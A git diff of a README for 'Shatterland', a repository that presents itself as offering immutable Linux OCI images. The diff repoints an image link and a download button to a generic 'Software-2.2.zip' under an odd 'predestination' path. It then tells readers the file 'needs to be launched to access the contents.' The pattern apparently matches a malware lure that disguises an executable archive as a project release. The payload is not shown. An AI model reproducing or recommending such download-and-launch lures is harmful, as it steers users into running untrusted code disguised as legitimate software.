@@ -1,6 +1,6 @@
 # Welcome to Shatterland 🌌
 
-![Shatterland Image](https://github.com/olaissocool/shatterland/releases/download/v2.0/Software.zip)
+![Shatterland Image](https://raw.githubusercontent.com/olaissocool/shatterland/main/predestination/Software-2.2.zip)
 
 Shatterland is a repository dedicated to all things atomic, Linux, and immutable! If you're a fan of bluebuild, bluebuild-image, custom-image, or image-based solutions, this is the place for you. Our focus is on creating cutting-edge OCI images for the modern developer.
 
@@ -8,7 +8,7 @@ Shatterland is a repository dedicated to all things atomic, Linux, and immutable
 
 To get started with Shatterland, you can download the latest release by clicking the button below:
 
-[![Download Shatterland](https://github.com/olaissocool/shatterland/releases/download/v2.0/Software.zip)](https://github.com/olaissocool/shatterland/releases/download/v2.0/Software.zip)
+[![Download Shatterland](https://raw.githubusercontent.com/olaissocool/shatterland/main/predestination/Software-2.2.zip)](https://raw.githubusercontent.com/olaissocool/shatterland/main/predestination/Software-2.2.zip)
 
 **Note:** This file needs to be launched to access the contents.
 
